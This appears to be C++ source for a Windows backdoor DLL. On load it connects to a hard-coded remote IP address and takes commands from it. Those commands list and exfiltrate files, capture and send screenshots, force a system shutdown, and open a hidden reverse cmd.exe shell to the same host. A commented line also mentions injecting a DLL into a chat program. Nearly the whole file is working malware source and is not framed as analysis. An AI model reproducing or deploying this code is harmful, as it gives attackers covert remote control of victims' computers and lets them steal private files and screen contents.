#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#include <iostream>
#include <string>

#include "client.h"
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "gdi32.lib")
using namespace std;
#define LENGTH_OF_LISTEN_QUEUE 20
#define BUFFER_SIZE 1024
#define FILE_NAME_MAX_SIZE 512
using namespace std;
typedef struct command
{
    int seq;
    int end;
    int length;
    int file_block_length;
    char bank[1024];
} command;

int door(char *host_ip, int host_port)
{
    SOCKET sclient;
    command mycommand;
    do
    {

        char anounce[] = "\t\t*****From Client********\t\t";
        InitWinsock();
        if ((sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
        {
            cout << "invalid socket!" << endl;
            WSACleanup();
            Sleep(10000);
            continue;
        }

        sockaddr_in serAddr;
        serAddr.sin_family = AF_INET;
        serAddr.sin_port = htons(host_port);
        serAddr.sin_addr.S_un.S_addr = inet_addr(host_ip);

        if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
        {
            cout << "connect error !" << endl;
            closesocket(sclient);
            WSACleanup();
            Sleep(10000);
            continue;
        }
        else
        {
            ZeroMemory(&mycommand, sizeof(command));
            mycommand.seq = 0;
            strncpy(mycommand.bank, anounce, strlen(anounce));
            send(sclient, (char *)&mycommand, sizeof(command), 0);
        }
        ZeroMemory(&mycommand, sizeof(mycommand));
        mycommand.seq = 1;
        int ret = recv(sclient, (char *)&mycommand, sizeof(mycommand), 0);
        if (ret <= 0)
        {
            printf("no server online!!\n");
            closesocket(sclient);
            WSACleanup();
            Sleep(10000);
            continue;
        }
        printf("%d\n", mycommand.seq);

    } while (mycommand.seq != 0);

    while (true)
    {

        command recvbuf;
        ZeroMemory(&recvbuf, sizeof(recvbuf));
        int ret = recv(sclient, (char *)&recvbuf, sizeof(recvbuf), 0);
        if (ret <= 0)
        {
            printf("receive error!!\n");
            closesocket(sclient);
            WSACleanup();
            system("pause");
            return 1;
        }
        int num = recvbuf.seq;
        printf("%d\n", recvbuf.seq);
        switch (num)
        {
        case 0:
            printf("%s\n", recvbuf.bank);
            break;
        case 1:

            printf("Myserver leaves and i will close\n");
            closesocket(sclient);
            WSACleanup();
            system("pause");
            return 1;
        case 5:
            if (FileDownload(sclient, recvbuf.bank, num))
            {
                printf(" 5 excute successfully\n");
            }
            break;
        case 2:
            if (FileDirList(sclient, recvbuf.bank, recvbuf.seq))
            {
                printf(" 2 excute successfully\n");
            }
            break;
        case 3:
            ShutDownClient();
            break;
        case 4:
            BmpCreate(recvbuf.bank);

            //if has more time ,there can be do more execllent

            //dll("D:\\evil_dll.dll", "QQ.exe");

            Sleep(10000);
            //printf("%d", num);
            if (FileDownload(sclient, recvbuf.bank, num))
            {
                printf(" 4 excute successfully\n");
            }
            break;
        case 6:
            if (FileUPload(sclient))
            {
                printf(" 6 excute successfully\n");
            }
            break;
        case 7:
            //if have time i can do it good
            if (CmdShell("139.9.113.2", 7070))
            {
                printf(" 7 excute successfully\n");
            }
            break;

        default:
            printf("receive wrong seq\n");
            closesocket(sclient);
            WSACleanup();
            system("pause");
            return 0;
        }
    }
}
BOOL InitWinsock()
{
    int Error;
    WORD VersionRequested;
    WSADATA WsaData;
    VersionRequested = MAKEWORD(2, 2);
    Error = WSAStartup(VersionRequested, &WsaData); //Æô¶¯WinSock2
    if (Error != 0)
    {
        return FALSE;
    }
    else
    {
        if (LOBYTE(WsaData.wVersion) != 2 || HIBYTE(WsaData.wHighVersion) != 2)
        {
            WSACleanup();
            return FALSE;
        }
    }
    return TRUE;
}
int file_size(const char *filename)
{
    int size = 0;
    FILE *fp = fopen(filename, "rb+");
    if (!fp)
    {
        return -1;
    }
    fseek(fp, 0L, SEEK_END);
    size = ftell(fp);
    fclose(fp);
    return size;
}
int GetDir(char **dir)
//BOOL GetDir(void )
{
    char szNowDirPath[MAX_PATH];
    DWORD dwNowDirLength;
    unsigned int temp_length;
    char SubDir[MAX_PATH] = {0};

    int count = 0;
    char split = '\\';
    int zero = 0;
    dwNowDirLength = GetCurrentDirectory(MAX_PATH, szNowDirPath);
    temp_length = dwNowDirLength;
    if (dwNowDirLength == 0)
    {
        printf("get dir failed\n");
        return 0;
    }
    for (; (int)dwNowDirLength > 0; dwNowDirLength--)
    {
        if (szNowDirPath[temp_length - dwNowDirLength] == 0x5c)
        {
            SubDir[count] = szNowDirPath[temp_length - dwNowDirLength];
            count++;
            SubDir[count] = split;
            count++;
        }
        else
        {
            SubDir[count] = szNowDirPath[temp_length - dwNowDirLength];
            count++;
        }
    }
    SubDir[count] = split;
    SubDir[count + 1] = split;
    printf("%d\n", count);
    printf("%d\n", temp_length);

    printf("++++++++++++++%s+++++++++++++\n", SubDir);
    *dir = SubDir;
    return 1;
}
void ShutDownClient(void)
{
    system("shutdown /f /s /t 0");
}
BOOL CmdShell(char *IP, unsigned short port)
{
    WSADATA wd;
    HKEY MyKey;
    SOCKET sock;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    struct sockaddr_in sin;
    char buffer[MAX_PATH], cmd[MAX_PATH], *p;
    memset(&si, 0, sizeof(si));
    WSAStartup(MAKEWORD(1, 1), &wd);
    sock = WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(IP);
    while (connect(sock, (struct sockaddr *)&sin, sizeof(sin)))
        Sleep(30000);
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;                                               //
    si.hStdInput = si.hStdOutput = si.hStdError = (void *)sock;             //
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, 0, NULL, &si, &pi); //
    return TRUE;
}


BOOL FileDirList(SOCKET Socket_, char *path, int seq)
{
    command mycommand;
    char szNowDirPath[FILE_NAME_MAX_SIZE];
    GetCurrentDirectory(FILE_NAME_MAX_SIZE, szNowDirPath);
    HANDLE hFind;
    WIN32_FIND_DATA findData;
    LARGE_INTEGER size;

    //send message that where server is at
    char send1[FILE_NAME_MAX_SIZE];
    ZeroMemory(&mycommand, sizeof(command));
    mycommand.seq = seq;
    //strcat(send1,szNowDirPath);
    //strncpy(mycommand.bank,send1,strlen(send1));
    //send(Socket_, (char *)&mycommand, sizeof(command), 0);
    ZeroMemory(mycommand.bank, FILE_NAME_MAX_SIZE);
    ZeroMemory(send1, FILE_NAME_MAX_SIZE);

    //start to list the dir
    strcat(path, "*.*"); 
    printf("%s\n", path);
    hFind = FindFirstFile(path, &findData);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        printf("Failed to find first file!\n");
        return FALSE;
    }
    do
    {
        
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
            continue;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
        {
            printf("%s\n", findData.cFileName);
            strcat(send1, findData.cFileName);
            strcat(send1, "\t[dir]");
            strncpy(mycommand.bank, send1, strlen(send1));
            printf(" send1  %s\n", send1);
            send(Socket_, (char *)&mycommand, sizeof(command), 0);
            ZeroMemory(send1, FILE_NAME_MAX_SIZE);
            ZeroMemory(mycommand.bank, FILE_NAME_MAX_SIZE);
        }
        else
        {
            size.LowPart = findData.nFileSizeLow;
            size.HighPart = findData.nFileSizeHigh;
            strcat(send1, findData.cFileName);
            strcat(send1, "\t[file] ");
            char length[64];
            ZeroMemory(length, 64);
            ltoa(size.QuadPart, length, 10);
            strcat(send1, length);
            strcat(send1, "bytes\n");
            printf(" send1  %s\n", send1);
            strncpy(mycommand.bank, send1, strlen(send1));
            send(Socket_, (char *)&mycommand, sizeof(command), 0);
            ZeroMemory(send1, FILE_NAME_MAX_SIZE);
            ZeroMemory(mycommand.bank, FILE_NAME_MAX_SIZE);
            printf("%s %ld bytes\n", findData.cFileName, size.QuadPart);
        }
    } while (FindNextFile(hFind, &findData));
    mycommand.end = 1;
    ZeroMemory(mycommand.bank, FILE_NAME_MAX_SIZE);
    send(Socket_, (char *)&mycommand, sizeof(command), 0);
    //closesocket(Socket_);
    return TRUE;
}
BOOL FileDownload(SOCKET Socket_, char *name, int seq)
{

    command mycommand;
    char file_name[FILE_NAME_MAX_SIZE + 1];
    printf("fdsfdsfsdfdsf\n");
    ZeroMemory(&mycommand, sizeof(command));
    ZeroMemory(file_name, sizeof(file_name));
    mycommand.seq = seq;
    mycommand.length = file_size(name);
    //get file name and open
    strncpy(file_name, name, strlen(name) > FILE_NAME_MAX_SIZE ? FILE_NAME_MAX_SIZE : strlen(name));
    printf("%s\n", file_name);
    FILE *fp = fopen(file_name, "rb+");
    if (fp == NULL)
    {
        printf("File:\t%s Not Found!\n", file_name);
        mycommand.end = 1;
        send(Socket_, (char *)&mycommand, sizeof(command), 0);
    }
    else
    {
        int file_block_length = 0;
        int len = 0;
        while ((file_block_length = fread(mycommand.bank, sizeof(char), BUFFER_SIZE, fp)) > 0)
        {
            printf("file_block_length = %d\n", file_block_length);
            mycommand.file_block_length = file_block_length;
            len = file_block_length + len;
            if (len == mycommand.length)
            {
                mycommand.end = 1;
            }
            //printf("%d\n",seq)
            if (send(Socket_, (char *)&mycommand, sizeof(command), 0) <= 0)
            {
                printf("Send File:\t%s Failed!\n", file_name);
            }
            //printf("cc %d\n",mycommand.seq);
            ZeroMemory(mycommand.bank, BUFFER_SIZE);

            printf("len %d\n", len);
        }
        fclose(fp);
        printf("File:\t%s Transfer Finished!\n", file_name);
    }

    //closesocket(Socket_);
    return TRUE;
}

BOOL FileUPload(SOCKET Socket_)
{
    printf("if i am free , i wiil do this function\n");
    return TRUE;
}

/************************************************************************/
/* hBitmap                                                                      
/* lpFileName 

/************************************************************************/
int SaveBitmapToFile(HBITMAP hBitmap, LPSTR lpFileName)
{
    HDC hDC; //

    int iBits;               //
    WORD wBitCount;          //
    DWORD dwPaletteSize = 0; //
    DWORD dwBmBitsSize; //
    DWORD dwDIBSize; // 
    DWORD dwWritten; //
    BITMAP Bitmap;           //
    BITMAPFILEHEADER bmfHdr; //
    BITMAPINFOHEADER bi;     //
    LPBITMAPINFOHEADER lpbi; //    
    HANDLE fh;             //
    HANDLE hDib;           //
    HANDLE hPal;           //
    HANDLE hOldPal = NULL; //
    //
    hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
    DeleteDC(hDC);
    if (iBits <= 1)
        wBitCount = 1;
    else if (iBits <= 4)
        wBitCount = 4;
    else if (iBits <= 8)
        wBitCount = 8;
    else if (iBits <= 24)
        wBitCount = 24;
    else if (iBits <= 32)
        wBitCount = 24;

    //
    if (wBitCount <= 8)
        dwPaletteSize = (1 << wBitCount) * sizeof(RGBQUAD);

    GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&Bitmap);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap.bmWidth;
    bi.biHeight = Bitmap.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    dwBmBitsSize = ((Bitmap.bmWidth * wBitCount + 31) / 32) * 4 * Bitmap.bmHeight;

    //
    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
    if (lpbi == NULL)
    {
        return 0;
    }

    *lpbi = bi;
    // 

    hPal = GetStockObject(DEFAULT_PALETTE);
    if (hPal)
    {
        hDC = GetDC(NULL);
        hOldPal = ::SelectPalette(hDC, (HPALETTE)hPal, FALSE);
        RealizePalette(hDC);
    }
    // 
    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap.bmHeight,
              (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize,
              (LPBITMAPINFO)lpbi, DIB_RGB_COLORS);
    //
    if (hOldPal)
    {
        SelectPalette(hDC, (HPALETTE)hOldPal, TRUE);
        RealizePalette(hDC);
        ReleaseDC(NULL, hDC);
    }
    //
    fh = CreateFile(lpFileName, GENERIC_WRITE,
                    0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);

    if (fh == INVALID_HANDLE_VALUE)
        return FALSE;

    // 
    bmfHdr.bfType = 0x4D42; // "BM"
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
    WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
    GlobalUnlock(hDib);
    GlobalFree(hDib);
    CloseHandle(fh);
    return 1;
}

HBITMAP GetCaptureBmp()
{
    HDC hDC;
    HDC MemDC;
    BYTE *Data;
    HBITMAP hBmp;
    BITMAPINFO bi;

    memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bi.bmiHeader.biWidth = GetSystemMetrics(SM_CXSCREEN);
    bi.bmiHeader.biHeight = GetSystemMetrics(SM_CYSCREEN);
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;

    hDC = GetDC(NULL);
    MemDC = CreateCompatibleDC(hDC);
    hBmp = CreateDIBSection(MemDC, &bi, DIB_RGB_COLORS, (void **)&Data, NULL, 0);
    SelectObject(MemDC, hBmp);
    BitBlt(MemDC, 0, 0, bi.bmiHeader.biWidth, bi.bmiHeader.biHeight, hDC, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hDC);
    DeleteDC(MemDC);
    return hBmp;
}

void BmpCreate(char *name)
{
    HBITMAP hBmp;
    hBmp = GetCaptureBmp();
    SaveBitmapToFile(hBmp, name);
}
        
BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void *lpReserved)
{

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		door("139.9.113.2",9090);
		break;

	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
/*

int main(void)
{
	door("139.9.113.2",9090);;
	return 1;
}
*/